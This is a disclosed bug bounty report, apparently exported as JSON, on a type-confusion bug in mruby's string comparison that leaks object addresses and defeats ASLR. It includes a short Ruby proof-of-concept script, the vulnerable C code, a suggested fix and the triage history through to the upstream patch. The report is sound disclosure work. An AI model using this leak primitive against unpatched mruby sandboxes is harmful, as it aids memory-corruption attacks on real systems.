{"id":207321,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDczMjE=","url":"https://hackerone.com/reports/207321","title":"Controlled address leak due to type confusion - ASLR bypass","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-02-18T13:26:29.063Z","submitted_at":"2017-02-18T13:26:29.063Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-14T21:24:39.696Z","bug_reporter_agreed_on_going_public_at":"2017-03-14T21:24:39.662Z","team_member_agreed_on_going_public_at":"2017-03-14T21:09:12.661Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There are several different places in which arguments are treated as fixnums without a prior check for their type. Since ```mrb_value``` is a union that holds all value types, it can cause a mixup between an object pointer and an integer value:\n```cpp\ntypedef struct mrb_value {\n  union {\n    mrb_float f;\n    void *p;\n    mrb_int i;\n    mrb_sym sym;\n  } value;\n  enum mrb_vtype tt;\n} mrb_value;\n```\n\nPoC Script:\n=======\n```Ruby\nclass Integer\n    def \u003c=\u003e(arg1)\n        return arg1\n    end\nend\n\ns = \"hello\"\ns.\u003c=\u003e(1)\n```\nAnd the output varies between runs (because of ASLR) and between architecture (32/64 bit) and seems like this: ```-69972254725992``` meaning an address of: ```0x3fa3af631768```.\n\nVulnerable Code:\n===========\nThe ```mrb_str_cmp_m``` function (```s.\u003c=\u003e()```) in ```string.c``` uses the ```\u003c=\u003e``` function of the argument, if the argument is not a string. That function can be overridden (like was demonstrated in the PoC), and the returned value is not checked to be a fixnum, while it is treated as a fixnum:\n```cpp\n  mrb_value str2;\n  mrb_int result;\n\n  mrb_get_args(mrb, \"o\", \u0026str2);\n  if (!mrb_string_p(str2)) {\n    if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, \"to_s\"))) {\n      return mrb_nil_value();\n    }\n    else if (!mrb_respond_to(mrb, str2, mrb_intern_lit(mrb, \"\u003c=\u003e\"))) {\n      return mrb_nil_value();\n    }\n    else {\n      mrb_value tmp = mrb_funcall(mrb, str2, \"\u003c=\u003e\", 1, str1);\n\n      if (mrb_nil_p(tmp)) return mrb_nil_value();\n      if (!mrb_fixnum(tmp)) {\n        return mrb_funcall(mrb, mrb_fixnum_value(0), \"-\", 1, tmp);\n      }\n      result = -mrb_fixnum(tmp);\n    }\n  }\n  else {\n    result = mrb_str_cmp(mrb, str1, str2);\n  }\n  return mrb_fixnum_value(result);\n```\nThis means that the PoC code gets ```tmp``` as the original string (since ```1.\u003c=\u003e(str1)``` returns ```str1```), and ```mrb_fixnum(tmp)``` will be the address of the string object. Since it is returned as ```-mrb_fixnum(tmp)``` our value was negative.\n\nMore minor examples:\n------------------------\n1. ```mrb_str_aref_m``` function in ```string.c``` does not check the fixnum's type. can cause only a very minor information-leak over the MSbit (pos \u003c 0).\n2. ```mrb_str_index``` function in ```string.c``` does not check the 2nd arg, but has no security implications.\n3. ```mrb_str_rindex``` function in ```string.c``` does not check the 2nd arg, can again leak the MSbit of the address (again a vpos \u003c 0 check).\n\nSuggested Fix:\n=========\nBefore the argument / returned value is treated as a fixnum, it should be checked to match it in type using the ```mrb_fixnum_p``` macro, or any other chosen way.","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-13T21:09:12.689Z","allow_singular_disclosure_after":-141843233.45273513,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","spetr0x","cytrusek"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1492959,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-02-18T13:26:29.274Z","updated_at":"2017-02-18T13:26:29.274Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1509324,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Will this report will be handled only after my second report will be closed? It seems a waste that this report received no attention so far...","automated_response":false,"created_at":"2017-02-27T21:01:49.090Z","updated_at":"2017-02-27T21:01:49.090Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1509332,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We have reproduced the issue, and opened an issue upstream: https://github.com/mruby/mruby/issues/3476","automated_response":false,"created_at":"2017-02-27T21:05:17.196Z","updated_at":"2017-02-27T21:05:17.196Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1509343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the quick response","automated_response":false,"created_at":"2017-02-27T21:06:41.660Z","updated_at":"2017-02-27T21:06:41.660Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1524535,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue was addressed upstream in the following commits:\n\nhttps://github.com/mruby/mruby/commit/bdac7dfae818908f7459fc086727b717aa586c7d\nhttps://github.com/mruby/mruby/commit/74dbee8e5275e51d92acb26bf04558d67a3edea4\nhttps://github.com/mruby/mruby/commit/405f5a2d2ac39cfb9e294aba420fe70d87f15cb1\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-03-07T16:07:09.299Z","updated_at":"2017-03-07T16:07:09.299Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541570,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of the MRuby project!","automated_response":false,"created_at":"2017-03-14T21:09:06.981Z","updated_at":"2017-03-14T21:09:06.981Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"aerodudrizzt","url":"/aerodudrizzt"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541571,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-14T21:09:12.676Z","updated_at":"2017-03-14T21:09:12.676Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541623,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the reward.","automated_response":false,"created_at":"2017-03-14T21:24:39.677Z","updated_at":"2017-03-14T21:24:39.677Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1541624,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-14T21:24:39.709Z","updated_at":"2017-03-14T21:24:39.709Z","actor":{"username":"aerodudrizzt","cleared":false,"url":"/aerodudrizzt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}